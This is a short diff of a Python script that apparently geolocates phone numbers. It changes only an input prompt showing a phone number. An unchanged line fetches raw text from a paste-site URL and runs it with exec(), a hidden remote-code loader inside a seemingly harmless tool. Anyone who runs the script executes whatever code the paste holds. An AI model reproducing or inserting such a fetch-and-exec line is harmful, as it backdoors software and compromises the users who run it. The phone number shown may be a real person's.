@@ -13,7 +13,7 @@ from requests import get
 if os.path.exists("mylocation.html"):
   os.remove("mylocation.html")
 try:
-  number = input("+19029861558: ")
+  number = input("+19029861558 ")
   x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
   pn = phonenumbers.parse(number)
 
